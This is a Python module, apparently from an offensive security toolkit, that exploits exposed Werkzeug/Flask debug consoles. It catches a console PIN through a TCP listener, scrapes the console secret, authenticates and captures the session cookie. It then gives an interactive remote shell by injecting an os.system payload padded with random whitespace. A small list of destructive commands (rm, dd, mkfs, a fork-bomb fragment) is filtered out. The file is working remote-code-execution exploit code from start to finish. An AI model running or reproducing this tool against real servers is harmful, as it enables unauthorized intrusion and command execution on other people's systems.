
from neotermcolor import cprint,colored as cl
from core.vmnf_payloads import VMNFPayloads
from random import randint,random,choice
from requests.utils import requote_uri
from datetime import datetime as dt
from urllib.parse import urlparse
from urllib.parse import quote
from bs4 import BeautifulSoup
from res.stage import stager
from ._atutils import load
from time import sleep
import socketserver
import collections
import requests
import sys
import json
import os
import re




class siddhi:
    def __init__(self, **vmnf_handler):
        self.vmnf_handler = vmnf_handler
        self.siddhi_name = cl('4tl4tl','blue')

    class TCPHandler(socketserver.BaseRequestHandler):
        def handle(self):
            
            self.siddhi_name = cl('4tl4tl','blue')
            _set_ = stager(**{'session': False}).check_forward(True)
            
            if _set_ in [False, None]:
                print(f'[{self.siddhi_name}]➳ Failure!\n')
                sys.exit()

            if _set_.get('forward_session').strip() == 'atlatl':
                _set_ = urlparse(_set_.get('target_url'))
                target_url = (_set_.scheme + '://' + _set_.netloc)

            self.data = self.request.recv(1024).decode().strip()

            if 'PIN' in self.data:
                PIN = re.search(".*(\d{3}-\d{3}-\d{3}).*", self.data)
            
                if PIN is not None:
                    PIN = PIN.group(1).strip()

                    print(f"[{self.siddhi_name}]➳ PIN caught: {cl(PIN,'white',attrs=['bold'])}")
                    sleep(1)
                
                    # this will be used in future versions
                    # self.request.sendall('blas1'.encode()) 
                    siddhi().console_hook(target_url, PIN)
                    setattr(self.server, '_BaseServer__shutdown_request', True)

    def get_secret(self,response):
        soup = BeautifulSoup(response.content, 'lxml')
        page_head = soup.head.text

        return (page_head[
            page_head.find('SECRET')-1:page_head.find(';')
                ].split('=')[1].replace('"','').strip()
        )

    def request_url(self,target_url,**headers):
        session = requests.session()
        
        try:
            return (session.get(
                target_url,
                headers=headers,
                verify=False,timeout=10
                )
            )
        except requests.exceptions.ReadTimeout:
            return False
        except requests.exceptions.ConnectionError:
            return False
        except requests.exceptions.InvalidSchema:
            return False
    
    def show_cmd_output(self,response):
        if not response:
            print(f'[{self.siddhi_name}]➳ Something went wrong!')
            return False

        if response.status_code == 200:
            out_text = ''
            soup = BeautifulSoup(response.content, 'lxml')
            cmd_response = soup.find_all('span', {'class': 'string'})
            p_response = cmd_response
            resp_l = len(cmd_response)
            
            if cmd_response is None:
                print(f'[{self.siddhi_name}]➳ Server response doesnt match with a expected one.')
                return False
            
            if resp_l > 1:
                p_response = [a.string.replace("\\n'",'').replace("'",'')\
                    for a in cmd_response\
                        if a.string is not None]

            print()
            for line in p_response:
                try:
                    out_text = ('     ' + line.get_text())
                except AttributeError:
                    
                    line = str(line).replace(
                            "\\n'",'').replace(
                                    "'",'').strip()

                    out_text = ('     ' + line)
                out_text = out_text.replace('\\n','').replace("'",'')   
                cprint(out_text, 'green')

            print()
            return out_text

    def console_hook(self,target:False, pin:False):

        if not target or not pin:
            cprint(f'[{self.siddhi_name}]- Missing scope: Run vf guide -m atlatl <--args,--examples>', 'red')
            return False

        target_url= f"{target}/console"
        auth_part= "?__debugger__=yes&cmd=pinauth&pin={}&s={}"
        cmd_part="?__debugger__=yes&cmd={}&frm=0&s={}"
    
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0", 
            "Accept": "application/json, text/javascript, */*; q=0.01", 
            "Accept-Language": "en-US,en;q=0.5", 
            "Accept-Encoding": "gzip, deflate", 
            "X-Requested-With": "XMLHttpRequest", 
            "Connection": "close", 
            "Referer": target_url
        }

        try:
            response = self.request_url(target_url,**headers)
        except requests.exceptions.InvalidURL:
            print(f'[{self.siddhi_name}]➳ Invalid URL address!')
            return False

        if not response:
            print(f'[{self.siddhi_name}]➳ Connection failure. Please, check target url and try again')
            return False

        secret = self.get_secret(response).strip()
    
        if not secret:
            print(f'[{self.siddhi_name}]➳ Console secret was not found, check target URL')
            return False

        if not pin:
            print(f'[{self.siddhi_name}]➳ Missing console PIN')
            return False

        auth_url = target_url + auth_part.format(pin,secret)
        response = self.request_url(auth_url,**headers)
    
        if not response:
            print(f'[{self.siddhi_name}]➳ We got some problems during initial steps. Make sure the target and port are correct.')
            sys.exit(1)

        if response.status_code == 200:
            try:
                auth_status = (response.json())
            except json.decoder.JSONDecodeError:
                print(f'[{self.siddhi_name}]➳ An error ocurred during parsing response')
                return False

            if auth_status.get('auth'):
                print(f'[{self.siddhi_name}]➳ Successfuly authenticated at {dt.now()}')
                sleep(1)
                for k,v in (response.headers.items()):
                    print(f'     + {k}: {v}')
        else:
            print(f'[{self.siddhi_name}]➳ Not authenticated')
            return False
    
        session_cookie = response.headers.get('Set-Cookie') 
    
        if session_cookie is None:
            print(f'[{self.siddhi_name}] Authentication error: The PIN entered does not seem fresh\n')
            return False

        hl_cookie = cl(session_cookie,'white', attrs=['bold'])
        print(f'\n[{self.siddhi_name}]➳ Using cookie {hl_cookie}')
        sleep(1)
    
        # update headers with set-cookie session
        headers.update({'Cookie':session_cookie})
        hl_sec = cl(secret,'white', attrs=['bold'])
        print(f'[{self.siddhi_name}]➳ Using secret {hl_sec}')
        sleep(1)
        
        id_url = target_url + cmd_part.format(self.get_payload('hostname'),secret)
        response = self.request_url(id_url,**headers)
        hostname = cl(self.show_cmd_output(response).strip(),'white')
        atlatl_flag = cl("تیر {}".format(self.siddhi_name),'red') 

        if response:
            dang_cmds = [
                'danger','rm', 
                'dd', 'mkfs', 
                '/dev/null', 
                'mv','{:|:'
            ] 

            while True:
                try:
                    cmd = input(cl(f'\n{atlatl_flag}@{hostname} ➳ ','blue'))
                except KeyboardInterrupt:
                    continue
                except EOFError:
                    continue

                if not cmd:
                    continue
                if cmd == 'exit':
                    sys.exit(0)

                if [c for c in cmd.split() if c in dang_cmds]:
                    exp = cl("""
                            ,--.!,
                        __/    -*-
                      ,d08b.   '|`
                      00SOMM   {}
                      `9MMP'""".format(cmd), "white")

                    cprint("""\n\tTake it easy sadhu, you could destroy the target. 
                    \r\tIf you're running it in localhost
                    \r\t    so you could destroy your own SO
                    {}

                    """.format(exp), 'red')
                    continue
                
                cmd = (" "*randint(10,100)) \
                        + cmd + (" "*randint(11,56))

                response = self.request_url(
                    target_url + \
                    cmd_part.format(
                        self.get_payload(cmd),
                        secret),
                    **headers
                )
                if not self.show_cmd_output(response):
                    continue

    def get_payload(self, cmd):
        return requote_uri(quote(
            "__import__('os').system('{} >/tmp/.x');\
            open('/tmp/.x').readlines()".format(cmd)
            ) 
        )

    def getSocketServer(self, target:False, port:False):

        try:
            port = int(port)
        except ValueError:
            print(f'\n[{elf.siddhi_name}] Invalid port type: {port}\n')
            return False

        print(f"[{self.siddhi_name}]➳ Listening at {cl(target,'white', attrs=['bold'])} {cl(port, 'white', attrs=['bold'])}...")

        try:
            with socketserver.TCPServer((target, port), self.TCPHandler) as server:
                server.serve_forever()
        except OSError:
            port = int(input(f'[{self.siddhi_name}]➳ Choose another port to start listener: '))
            self.getSocketServer(target, port)

    def start(self, port=False):
        
        if self.vmnf_handler.get('listener_mode'):
            self.getSocketServer(
                self.vmnf_handler.get('local_host'),
                self.vmnf_handler.get('local_port'),
            )
            
            return True
        
        elif self.vmnf_handler.get('auth_mode'):
            self.console_hook(
                self.vmnf_handler.get("target_url"),
                self.vmnf_handler.get("console_pin")
            )
            
            return True

        elif self.vmnf_handler.get('session_mode'):
            self.load()
    
            self.vmnf_handler = stager(**self.vmnf_handler).check_forward()
        
            if not self.vmnf_handler:
                print(f'[{self.siddhi_name}] An error occurred while loading session.')
                
                return False

            call_siddhi = cl(self.vmnf_handler.get('module_run'), 'blue')
        
            print(f'[{self.siddhi_name}]➳ Loading settings from {call_siddhi} session...')
            sleep(1)

            target = self.vmnf_handler.get('local_host','127.0.0.1')
            port = self.vmnf_handler.get('local_port',9000)
            self.getSocketServer(target, port)

